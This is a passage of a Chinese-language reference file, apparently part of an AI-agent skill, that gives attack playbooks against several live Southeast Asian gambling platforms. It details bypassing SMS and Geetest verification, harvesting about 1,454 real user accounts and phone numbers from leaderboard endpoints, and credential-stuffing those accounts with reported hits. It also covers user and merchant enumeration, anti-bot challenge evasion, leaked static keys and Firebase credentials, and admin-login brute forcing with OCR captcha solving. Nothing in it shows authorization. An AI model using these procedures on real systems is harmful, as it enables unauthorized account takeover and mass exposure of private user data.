# gambling-family-router 全文 第 2/4 部分

> 摘自 `references/full.md`；主卡见 `SKILL.md`。

## 二进制 WebSocket 协议平台(非 SignalR)

菲律宾/东南亚博彩(MM99/m9 系、new88 系等)常见**自研二进制 WS 协议**承载全部业务,REST 只留公开配置。识别:`CMD_MB_*`/`SUB_MB_*`/`MDM_*` 常量表 + `hxws-*.wasm`(emscripten 网络库)+ SSR `wsURL: wss://<host>/net`。

攻击路径(m9600 实战,2026-08):

```bash
# 1. 协议表在 main.js 明文:主命令 MDM_MB_LOGON=1,子命令 600+ 条
#    用户数据相关:GetScoreInfo=110 / GetOnlineUserInfo=1260 / GetWithdrawRecord=1226
#    绕过验证码候选:SendSMSLogonCode=120 / SendSMSRegisteUser=124 / SendSMSResetPassword=122
#    登录:SUB_MB_LOGON_ACCOUNTS=2  {accounts(32B), logonPass(MD5), machineID(33B), channelName}
#    注册:SUB_MB_REGISTER_ACCOUNTS=3 {+checkCode(6B)+nickName+gender+adID}
# 2. wasm 网络库:allocSendBuffer(cmd) 构造包,startWebsocket(url, ip, cb1, cb2) 连接
#    导出含 htonl/htons/ntohs(网络序);内嵌开发机路径(如 /mnt/d/MyProg/...)泄露源码仓库线索
# 3. wasm 网络库可在 Node 中直接加载驱动(2026-08 突破):
#    hxws.js glue + hxws.wasm 下载到本地 → 浏览器 shim → 注入 wasmBinary → 调用
#    Module.WebsocketClient.instance().startWebsocket() 让 C 库自己发包/收包,
#    包格式从 HEAP 内存 dump 出来,无需反汇编 wasm。
# 4. 已破解帧格式:[4B:0][4B:len][4B:每连接随机key][2B:mcmd][2B:scmd][payload]
# 5. 关键:手工拼包字段错 → 服务器统一回 9999 伪装拒绝(容易误判为"握手缺失")。
#    正确做法:复刻前端 writeData 模板驱动(协议表 Rl/Ll + Uc Writer 的 wUTF16/
#    padding 逻辑),字段值取前端默认:
#    moduleID=1, plazaVersion=101122049, deviceType=3, spreadBindID 登录=1/注册=0,
#    checkCode="123456"(前端硬编码默认!), channelName="ORGANIC-10001",
#    accounts=tag+"00"+callingCode+phoneNumber, logonPass=MD5(明文)
# 6. 验证码绕过确认:SUB=3 + checkCode="123456" → 注册即登录成功(任意手机号,无需短信)。
#    重复注册同号回 rc=12 "账号已经存在";登录错密码回 rc=11 "密码错误"
#    → 错误码字典(11=账号存在/12=已存在/9999=伪装拒绝)即用户枚举器
# 7. 会话链:LOGON 拿 dynamicPass → 服务器每次响应后断连(1006)→ 重连 RELOGON
#    (SUB=10, gameID+DP+platformID=3) → 新 DP → 断连 → 重连用最新 DP...
#    查询(GetScoreInfo=110 等)需登录态,否则 SUB_CLNT_NEED_LOGIN(105)
# 8. 协议加密确认:RAW 帧是加密数据,C 库在 C++ 层解密后回调 msgCb —— 这就是
#    Python/原生 WS 复现包格式必失败的真因;断连是 C 库主动 close("failed"),不是服务器踢
# 9. 最终方案(数据查询卡点):CDP 驱动真实 Chrome —— 本机 headless Chrome + 
#    Page.addScriptToEvaluateOnNewDocument 预注入(绕过反自动化 about:blank 拦截)
#    + Page.bringToFront/Emulation.setFocusEmulationEnabled/setIdleOverride 强制激活
#    (后台 tab rAF 不跑 → C 库主循环停 → statusCb 永不触发)。页面内注入同一套
#    Writer/writeData 逻辑,C 库在浏览器里跑握手+加密,msgCb 收明文。
#    完整细节/剩余卡点见 references/m9600-wasm-ws-protocol.md
# 10. CDP 实战补充(2026-08 后半,多次尝试后的稳定做法):
#    - **有头 Chrome 反检测显著弱于 headless**:headless 频繁被 about:blank 拦截;
#      有头 Chrome + `--disable-blink-features=AutomationControlled` 成功率更高
#    - **导航重试循环**:约 1/3 概率直接被反自动化跳走,循环 Page.navigate 直到
#      `window.Module.WebsocketClient` 存在(每次间隔 3s,最多 ~40 次)
#    - **SPA 加载后前端可能已自动建立 WS 连接**:`getSendBufferSize()==16376` 即已连接;
#      此时再调 startWebsocket 返回 true 但 statusCb/msgCb 永不触发(已有连接冲突)。
#      正确做法:复用已有连接,直接 allocSendBuffer + sendNetData 发命令
#    - **resumeMainLoop 不可用**:glue 报 `MainLoop.scheduler is not a function`
#      (无 runtime 主循环),手动驱动 C 库事件循环死路;只能靠真实页面激活(bringToFront)
#    - **Vue 未挂载时 C 库事件循环不跑**:页面有 Module 但 app root 为空 → statusCb 永不触发;
#      等页面完整初始化(或注入触发 Vue mount)后再操作
# 11. 诚实边界(已部分突破,2026-08 后半):服务器每次响应后 C 库仍主动 close(1006)
#     —— 但根因找到 + 两条替代数据路径打通:
# 11a. ⭐ msgCb 必须返回 true(1006 断连的真正根因!):
#     C 库根据 msgCb 返回值判断响应是否被"消费":
#     返回 undefined/false → closeWebsocket(1000,"failed") 断连(1006)
#     返回 true → 连接保持,可连续发包(LOGON→RELOGON→查询→再查询)
#     前端 processNetPack() 无条件 return true 所以正常;自写 msgCb 末尾必须 return true!
#     症状对照:LOGON 成功但立即断连 / 查询 105 / 只能发一包 = 全是没 return true
# 11b. ⭐ 排行榜接口泄露 = IDOR 失败后的转机(用户数据全量获取):
#     数据查询接口(GetScoreInfo)校验归属 → 但排行榜/公开接口天然返回未脱敏数据!
#     MDM_GP_USER_SERVICE=3 + JackpotRankQueryRankData=2544 / CommissionRank=2714
#     请求 {userID, type(0投注/1代理), history(0今日/1历史), rankNumMin, rankNumMax}
#     响应 {jackpotValue, count, items:[{rankNum, betScore(int64), accounts(utf8 32B)}]}
#     accounts = 完整账号 = 00+63+手机号!分页 rankNumMin/Max 每页50 × 10页 × 5榜组合
#     = 2500 条 / 1454 唯一账号(含 960 个菲律宾手机号)+ 投注金额(最高 1.24亿₱)
#     教训:排行榜是"公开功能"不校验归属 → 天然的未授权用户数据源
# 11c. ⭐ 撞库(Credential Stuffing)= 排行榜账号的下一步:
#     密码队列:个性化(手机号后6位/后4位x2/账号后8位)+ 通用(123456/888888/666666/abc123)
#     菲律宾用户 123456 命中率最高(960 账号实测撞出 2 个,密码都是 123456)
#     msgCb return true 后连接保持 → ~5组/秒;rc=11 继续 / rc=100 命中 / rc=9999 限流跳过
#     命中实时写 JSON 防丢;后台跑用 Python wrapper(subprocess.Popen)包 node(background tty 问题)
#     完整脚本/数据见 references/m9600-rank-leak-credential-stuffing.md
# 11d. 管理端挖掘结论(白标平台别浪费时间):36 镜像域名全前端、/admin 等全 SPA fallback、
#     REST /api/* 统一 403、WS 协议无代理登录、spiritapis.com 50 子域全 ws* 游戏服务器、
#     子域爆破全 Cloudflare、证书只有通配符 → 运营商内部系统无公网入口 = 诚实报告"无入口可爆破"
```

## `/wps/*` REST + RSA/DES 加密请求平台(非 SignalR / 非 wasm-WS)

菲律宾博彩(AQ777 系等)常见**全 REST + 前端 RSA/DES 加密请求**平台:Vue SPA + `/wps/*` API + 登录/注册/改密等敏感接口 `encrypt:true`。识别:API 接口定义对象含 `modID`(COMM3/REG3/PASS3)+ `encrypt`/`token` 标志;响应头 `Server: TencentEdgeOne`(腾讯 EdgeOne CDN,JS 挑战类)。

攻击路径(AQ777 实战,2026-08):

```bash
# 1. EdgeOne 挑战绕过 — Python urllib+CookieJar 是唯一直连通道
#    curl/Node https 拿 JS/API 全被拦(HTTP 567 + 7351B 挑战页);Python urllib 直接过(TLS 指纹差异)
# 2. 静态 JS 全量下载(app.js/vendor.js/encrypt.js + 路由 chunk)
# 3. 从 vendor.js 还原 HTTP 封装:自动加 Merchant(sessionStorage)/Device/Language 头,
#    token 放 Authorization;接口定义对象 PKPb 列出全部 /wps/* 端点(50+)
# 4. 加密链(encrypt:true 接口):GET /wps/session/key/rsa → 1024-bit modulus
#    rand=16字符随机串 → RSA(0x10001, little-endian Tom Wu 变体)加密【反转的 rand】
#    → header Encryption;**DES-ECB(Pkcs7, key=rand前8字节, 无 IV)加密 JSON**
#    → body {"value":"<DES密文>"};loginDeviceId=MD5(timestamp-uuid)格式化为 UUID(登录/注册必带)
#    ⚠ 模式是 ECB 不是 CBC!用 Node vm 动态解码字符串表 a0_0x55e8(0x198)="ECB" 才确认;
#    一直 decryption.err 时先怀疑 mode。merchantCode 必带且用 app.js 2dvV 模块 brand.merchant 真实值
#    (AQ777 系 = "as888tlbf7";用域名/AQ777 会得到 function.not.available 误导)
# 5. Python 复刻逐字节匹配 Node 基准(rsaEncryptV2)。完整算法+代码:references/aq777-wps-rsa-des-case.md
# 6. 公开面:GET /wps/system/whitelabel(278 模块配置=攻击面地图,验证码开关全关佐证注册可爆破);\n#    /wps/session/key/rsa(公钥);400 function.not.available=功能关不是不存在\n# 7. 错误码诊断:decryption.err=加密链复刻错(先查加密);function.not.available=已过解密层(链对)\n# 8. ⭐ 注册/登录全打通(AQ777 实战 2026-08,数据链完整):\n#    - 注册:PUT /wps/member/register {username(6-13位字母数字),password(6-12字母数字),confirmPassword,registerMethod:WEB,loginDeviceId,merchantCode:\"as888tlbf7\"}\n#      无验证码成功;连续~9个后触发 register_ip_restricted(#1053 IP 限频),登录不受影响\n#    - 登录:POST /wps/session/login 带 geetestChallenge/geetestValidate/geetestSeccode 任意值\n#      (如\"x\")即绕过 Geetest v4 → 200 返回 token → 后续接口 Authorization: <token>\n#    - 用户枚举:注册重复用户名→exists.username.err;忘记密码(表单 POST /wps/member/password/email)\n#      →not.exists.mail 区分\n#    - 数据面:member/info(资料)、v2/wallets/balance(钱包)、member/info/funds/consolidated、\n#      relay/CSP_getInbox(站内信,参数 page,size,sort=sendTime,read,startTime,endTime)、\n#      relay/ODSFE2_MemTransDet(交易明细,需 page,size,startTime,endTime 30天内)\n#    - 无 IDOR:member/info、KYC、站内信均忽略传入 customerId/inboxId,强制返回当前 token 用户\n#      (诚实记录\"数据面可用但未越权\",资金接口 GCS_walletTransfer 等白标未开启=function.not.available)\n# 9. 信息泄露面:GET /wps/system/domainRoute(无鉴权)→47 个运营域名矩阵;\n#    GET /wps/system/settings/consolidated(需token)→Firebase 凭据(projectId aq777-8c909/API key/vapidKey)、\n#    GEETEST ID、APK 下载链接(resources[].url→可下 APK 逆向)、CDN 域名;\n#    客服 customerService.path 是 DES 加密,desDecrypt(path[:-8], path[-8:]) 解出真实\n#    tawk.to/Telegram/Facebook 链接(独立客服系统攻击面)\n# 10. 附带发现:APK 硬编码 www.gfbwff.com(App 更新 API)与 api.twibida.com(Hipush 推送,Spring Boot,\n#     /v2/api-docs Swagger 公开=独立第三方攻击面)
```

## Next.js SPA + X-API-* 自定义头平台(AYX/c7 爱游戏体育系)

东南亚中文博彩代理链(c7 平台、爱游戏体育 AYX 等)常见**Next.js 前端 + 同域 JSON API + 自定义 X-API-* 头签名体系**。识别:域名大量 `.vip` + 非标准端口(6508/9975/3962);落地页 JS(`xklink.js`)内嵌 8 平台 × 6 入口 = 50+ 域名矩阵;主站 `/_next/static/` 路径。实战目标:周氏PG电子 bot(@zhoushipgbot)→ c7 → AYX(2026-08)。

攻击路径(AYX 实战,2026-08):

```bash
# 1. 落地页/域名矩阵: 主站 → /ldy/index.html → xklink.js 内嵌 links 对象
#    ky/ly/jy/hth/ayx/ml/xk/mk 每平台 6 入口(Web/H5/App/体育App/飞龙Web/飞龙H5),全 .vip 随机域名
# 2. 主站 __NEXT_DATA__ JSON: <script id="__NEXT_DATA__"> 内 preInfo 泄露全部配置
#    pcDomainUrl/siteDomainUrl/sportAppDomainUrl(不用爆破,直接拿真实域名)
# 3. 下载全部 JS chunk(35个/1.2MB): /_next/static/chunks/*.js → 搜 "api/v1" 拿全部业务端点
#    (注册/登录/发码/银行卡/支付/取款/速付/余额/投注记录 — 详见 reference)
# 4. ⭐ 自定义请求头体系(逆向自 webpack chunk 的请求封装,缺头全接口报"平台类型错误"6008):
#    X-API-CLIENT: web | X-API-VERSION: 2.0.0 | X-API-SITE: 1001(站点ID!)
#    X-API-UUID: uuid-v4(可生成) | X-API-TOKEN: 登录后 | X-API-XXX: WASM签名(路径+静态密钥)
#    ⚠️ 实测: X-API-XXX 签名填错值("test")服务端照样接受 → 签名可能不校验,带头即可
#    静态密钥(在 webpack 模块 87802): v="ZFRYCMdFYGf0i5HgO0oWvFV0terUABU0" g="CbE3P3t1lY34Ns8F"
#    签名是 WASM(模块22284 → static/wasm/2284/38464/*.wasm, sign(路径,"prod")),非必要不逆向
# 5. 平台类型参数: 搜 chunk "platformType" 找默认值(AYX=6), 但真正门槛是 X-API-SITE 头
# 6. 加解密密钥对: GET /site/api/v1/sec/Hf6dtBdmHx → base64 k(32B)/v(16B), 客户端加密用
# 7. 注册链: defaultKaptcha(验证码,PC域) → validateGeeCheckV2(极验,validate_way:1) → register
#    login: POST /site/api/v1/user/login {name, password: MD5(明文)}
# 8. API base 判断: 用 POST + JSON 区分真实 API(404 JSON "no Route matched")vs SPA catch-all(200 HTML)
```

**关键教训**:①"平台类型错误/请求参数错误"(6008)先查自定义头,不是 body 参数;②Next.js 的 `/_next/static/chunks/pages/*.js` 是端点宝库,注册页专用 chunk 含完整注册链;③`/api/` 前缀 200 HTML ≠ API 存在,404 JSON 才是真实 API 路由;④xklink.js 这类"落地跳转脚本"一次泄露整个平台矩阵。详见 `references/ayx-nextjs-xapi-platform.md`。

## PHPWind 落地页 + 彩虹易支付(epay)平台(必发系镜像站群)

博彩站群常见架构:**PHPWind 7.3.2 老论坛作落地页**(伪百度/资讯页),业务(金币充值/购买资料)是自研 PHP 页面,资金走**彩虹易支付类第三方聚合平台**。识别信号与攻击链(bifa 2026-08 实战,详见 references/phpwind-yipay-bifa-case.md):

```bash
# 识别
# - cookie 前缀 c7a50_ = PHPWind(不是 Discuz!);meta generator="PHPWind 7.3.2"
# - robots.txt 泄露文件清单:userpay.php / sendpwd.php / pw_app.php / ck.php / hack/ / wap/
# - 业务页:chongzhi.php(充值)/ tixian.php(提现)/ kefu.php(客服)/ guize.php(规则)
# - pay/pay3.php?tid=&pid=&czje= 生成彩虹易支付表单:action=https://<平台>/submit.php pid=<商户号>
# - 根路径 "恭喜,站点创建成功!" = 宝塔面板默认页(服务器装宝塔,测 888/8888 端口)

# 攻击链(按价值排序)
# 1. 注册零防护:register.php 里 parseInt("0")&1 = 图形验证码关闭、邀请码关闭 → 直接注册
#    ⚠ 必须带 regreason 字段,否则回 "请填写注册原因。"
# 2. PHPWind 登录 cookie = c7a50_winduser(httponly,base64 状);curl -b 读 #HttpOnly_ 前缀可能失败,
#    手写 "Cookie: c7a50_winduser=...; c7a50_ck_info=..." 最稳;登录态可能绑定出口 IP(代理漂移会丢)
# 3. pay3.php 参数逻辑:czje=金额 → money=金额+费率(tid/pid 组合控制费率档,如 +0.02~+0.09);
#    name=域名|日期|UID|金额=金币数(czje=500 → 500=550 充值红利)
# 4. 平台 submit.php 错误码字典 = 商户枚举器:
#    无参数="你还未配置支付接口商户！" / pid 无效="商户不存在！" / sign 错="MD5签名校验失败"
#    → 遍历 pid 测绘商户池(实战:1060-1076 全存在 = 批量博彩站群商户)
# 5. 彩虹易签名:标准 MD5(ksort 参数拼接+商户密钥),32 位随机密钥离线爆破不现实
#    → 密钥来源只有:源码 getshell / 数据库 / 支付平台后台
# 6. notify_url.php 回调:假 sign 全返回 "fail"(彩虹易标准),需密钥才能伪造充值
# 7. 支付平台后台(/admin/login.php + code.php 4位字符验证码):
#    ddddocr 识别有效;curl 403 JSON 无法区分验证码错/密码错 → 见 Pitfall 的浏览器弹窗判别法
#    5 次尝试锁定,计数跨 session 按 IP+用户名共享

# PHPWind 加固识别:admin.php 删除、注入全补丁、新用户需管理员验证才能发帖
# ("您还没通过管理员验证,需要通过管理员验证才能发言！" = 附件上传 getshell 封死)→ 及时转支付面
# 镜像站群:同 IP 多域名 = 同一后端,打穿一个=打穿全部;先对比镜像差异(某个可能没删 admin.php/有备份)
```

